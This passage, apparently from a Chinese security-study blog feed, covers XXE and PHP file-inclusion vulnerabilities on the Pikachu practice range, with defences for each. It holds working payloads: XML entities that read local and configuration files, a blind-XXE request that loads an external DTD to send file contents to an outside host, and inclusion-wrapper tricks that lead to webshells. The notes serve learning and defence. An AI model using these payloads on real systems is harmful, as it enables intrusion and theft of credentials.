class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>BP中直接显示明文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/99.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br>将99.txt文件内容显示出来<br></code></pre></td></tr></table></figure><h5 id="例题-皮卡丘靶场例题-读config-inc-php文件"><a href="#例题-皮卡丘靶场例题-读config-inc-php文件" class="headerlink" title="例题:皮卡丘靶场例题,读config.inc.php文件"></a>例题:皮卡丘靶场例题,读config.inc.php文件</h5><h5 id="使用php-x2F-x2F-filter-x2F-read来转化"><a href="#使用php-x2F-x2F-filter-x2F-read来转化" class="headerlink" title="使用php:&#x2F;&#x2F;filter&#x2F;read来转化"></a>使用php:&#x2F;&#x2F;filter&#x2F;read来转化</h5><p>有回显(使用base64)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="有回显-明文"><a href="#有回显-明文" class="headerlink" title="有回显(明文)"></a>有回显(明文)</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/pikachu-master/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XXE无回显的利用"><a href="#XXE无回显的利用" class="headerlink" title="XXE无回显的利用"></a>XXE无回显的利用</h5><p>发送给漏洞服务器的包(无回显时也可用)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vul/xxe/xxe_1.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.pikachu.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>287<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://www.pikachu.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.pikachu.com/vul/xxe/xxe_1.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=38avn1v46f2n43a3qe8hrr5u73<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-mojolicious"><span class="language-xml">xml=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="language-xml"><span class="language-mojolicious"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious">]&gt;</span>&amp;submit=%E6%8F%90%E4%BA%A4</span></span><br></code></pre></td></tr></table></figure><h5 id="如何挖掘XXE"><a href="#如何挖掘XXE" class="headerlink" title="如何挖掘XXE"></a>如何挖掘XXE</h5><p>1.手工测试</p><ol><li>有回显XXE:<ol><li>观察请求头Accept字段是否有application&#x2F;xml, text&#x2F;xml等</li><li>提交一个POST请求，请求头加上Content-type:application&#x2F;xml</li><li>提交一个简单的xml测试语句，查看打印结果</li></ol></li><li>无回显XXE<ol><li>提交测试数据</li><li>利用http协议访问攻击主机，然后查看访问日志确定是否存在XXE</li><li>或者利用dnslog，地址: <a href="http://www.dnslog.cnl/">http://www.dnslog.cnl</a></li></ol></li></ol><p>2.代码审计</p><p>3.工具自动化注入</p><h5 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">方案一：使用开发语言提供的禁用外部实体的方法<br>PHP<br>libxml<span class="hljs-constructor">_disable_entity_loader(<span class="hljs-params">true</span>)</span>;<br><br>JAVA<br>DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;<br><br>Python:<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.<span class="hljs-constructor">XMLParser(<span class="hljs-params">resolve_entities</span>=False)</span>)<br><br>方案二：过滤用户提交的XML数据<br>过滤关键词&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p><span id="more"></span><h5 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">文件包含漏洞产生的原因是在通过引入文件时，包含的文件名是用户可控的,由于传入的文件名没有经过合理的校验，或者校验被绕过。<br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的形成-需要满足两个条件"><a href="#文件包含漏洞的形成-需要满足两个条件" class="headerlink" title="文件包含漏洞的形成,需要满足两个条件"></a>文件包含漏洞的形成,需要满足两个条件</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">include</span>()等函数通过动态变量的方式引入需要包含的文件<br><span class="hljs-number">2.</span>用户能够控制这个动态变量<br></code></pre></td></tr></table></figure><h5 id="PHP中常见包含文件函数"><a href="#PHP中常见包含文件函数" class="headerlink" title="PHP中常见包含文件函数"></a>PHP中常见包含文件函数</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fopen</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的危害"><a href="#文件包含漏洞的危害" class="headerlink" title="文件包含漏洞的危害"></a>文件包含漏洞的危害</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">敏感信息泄露<br>获取<span class="hljs-keyword">shell</span><span class="language-bash"></span><br><span class="language-bash">任意命令执行</span><br></code></pre></td></tr></table></figure><h5 id="require和include两个函数的区别"><a href="#require和include两个函数的区别" class="headerlink" title="require和include两个函数的区别"></a>require和include两个函数的区别</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">include</span>:包含的文件不存在时,程序会继续执行<br><span class="hljs-built_in">require</span>:包含的文件不存在时,程序停止执行<br>(如果出现语法错误，两个不会继续执行，如果是找不到这个文件，<span class="hljs-built_in">include</span>继续执行，<span class="hljs-built_in">require</span>，停止执行)<br></code></pre></td></tr></table></figure><h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">本地文件包含      fopen<br>远程文件包含<span class="hljs-meta"><span class="hljs-keyword">include</span></span><br></code></pre></td></tr></table></figure><h5 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">上传图片马，包含图片马GetShell<br>读取网站源码以及配置文件<br>包含日志文件GetShell<br>包含session文件拿<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h5 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-number">1</span>.当被包含的文件在服务器本地时，就形成的本地文件包含漏洞。<br><span class="hljs-number">2</span>.本地文件包含和远程文件包含造成漏洞的原因是一样的，当php.ini中的配置选项allow_url_fopen和allow_url_include为<span class="hljs-keyword">ON</span>的话，则包含的文件可以是第三方服务器中的文件，这样就形成了远程文件包含漏洞。(fopen默认是打开的,本地的;<span class="hljs-keyword">include</span>是远程)<br></code></pre></td></tr></table></figure><p>截断符号</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haml">?<br><span class="hljs-tag">%<span class="hljs-selector-tag">23</span></span><br></code></pre></td></tr></table></figure><h5 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">第一种：<br>file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]);            <span class="hljs-regexp">//</span>任意文件读取<br><br>第二种:<br><span class="hljs-variable">$a</span> = fopen(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>],<span class="hljs-string">&#x27;r&#x27;</span>);<br>echo fread(<span class="hljs-variable">$a</span>,<span class="hljs-number">200</span>)                          <span class="hljs-regexp">//</span><span class="hljs-number">200</span>是读取长度   <br></code></pre></td></tr></table></figure><h3 id="文件包含相关协议"><a href="#文件包含相关协议" class="headerlink" title="文件包含相关协议"></a>文件包含相关协议</h3><h5 id="php-x2F-x2F-fileter-读取"><a href="#php-x2F-x2F-fileter-读取" class="headerlink" title="php:&#x2F;&#x2F;fileter       读取"></a>php:&#x2F;&#x2F;fileter       读取</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>      ,     allow_url_include=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span><br>php://<span class="hljs-keyword">filter</span>/<span class="hljs-keyword">read</span>=convert.base64-encode/resource=文件路径名<br></code></pre></td></tr></table></figure><h5 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">allow_url_fopen=<span class="hljs-keyword">On</span>/<span class="hljs-keyword">Off</span>   ,    allow_url_include=<span class="hljs-keyword">On</span><br>需要<span class="hljs-keyword">GET</span>提交,在BP转换成[POST提交]<br></code></pre></td></tr></table></figure><h5 id="data-text-x2F-plain"><a href="#data-text-x2F-plain" class="headerlink" title="data:text&#x2F;plain"></a>data:text&#x2F;plain</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">allow_url_fopen=On      ,     allow_url_include=On<br>用法<span class="hljs-number">1</span>: ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span>执行内容<span class="hljs-meta">?&gt;</span><br>用法<span class="hljs-number">2</span>: ?file=data:text/plain;base64,编码后的php代码<br>注意base64加密之后的代码,不能够有+号,否则会和url中的+编码冲突<br></code></pre></td></tr></table></figure><h5 id="zip-x2F-x2F"><a href="#zip-x2F-x2F" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">使用zip协议，需要将<span class="hljs-comment">#编码改为%23，所以需要PHP的版本&gt; =5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23</span><br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.zip%<span class="hljs-number">231</span>.txt<br>zip:<span class="hljs-regexp">//</span><span class="hljs-number">1</span>.jpg%<span class="hljs-number">231</span>.txt<br></code></pre></td></tr></table></figure><h5 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h5><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">file</span>:<span class="hljs-comment">//可以用来访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。</span><br>用法：?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">file</span>:<span class="hljs-comment">//文件绝对路径</span><br></code></pre></td></tr></table></figure><h5 id="Phar-x2F-x2F-反序列化漏洞"><a href="#Phar-x2F-x2F-反序列化漏洞" class="headerlink" title="Phar:&#x2F;&#x2F;(反序列化漏洞)"></a>Phar:&#x2F;&#x2F;(反序列化漏洞)</h5><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata">用法:?<span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//压缩包/内部文件示例:</span><br>phar:<span class="hljs-comment">//xxx.png/shell.php</span><br>注意:PHP &gt;= 5.3.0压缩包需要是<span class="hljs-keyword">zip</span>协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。<br>步骤:写一个一句话木马文件<span class="hljs-keyword">shell</span>.php，然后用<span class="hljs-keyword">zip</span>协议压缩为<span class="hljs-keyword">shell</span>.<span class="hljs-keyword">zip</span>,然后将后缀改为png等其他格式。<br></code></pre></td></tr></table></figure><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">需要magic_quotes_gpc=<span class="hljs-keyword">off</span>,<br>PHP小于<span class="hljs-number">5.3</span>.<span class="hljs-number">4</span>有效<br>用法: <span class="hljs-keyword">test</span>.jpg%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h5 id="伪协议包含的类型总结"><a href="#伪协议包含的类型总结" class="headerlink" title="伪协议包含的类型总结"></a>伪协议包含的类型总结</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span>访问本地文件系统<br>http:<span class="hljs-regexp">//</span>访问 HTTPs 网址<br>Php:<span class="hljs-regexp">//</span>访问输入输出流<br>Zib:<span class="hljs-regexp">//</span>压缩流<br>Data:<span class="hljs-regexp">//</span>数据<br>Phar:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><h4 id="文件包含漏洞防御"><a href="#文件包含漏洞防御" class="headerlink" title="文件包含漏洞防御"></a>文件包含漏洞防御</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> 设置白名单<br>   代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。<br><span class="hljs-number">2.</span> 过滤危险字符<br>   由于<span class="hljs-keyword">Include</span>/Require可以对PHP <span class="hljs-keyword">Wrapper</span>形式的地址进行包含执行（需要配置php.ini)，在Linux环境中可以通过&quot;../../&quot;&quot;的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。<br>3. 设置文件目录<br>   PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。<br>4. 关闭危险配置(禁止远程文件包含)<br>   PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test123</title>
    <link href="/2022/10/01/test123/"/>
    <url>/2022/10/01/test123/</url>
    
    <content type="html"><![CDATA[<p>112233</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
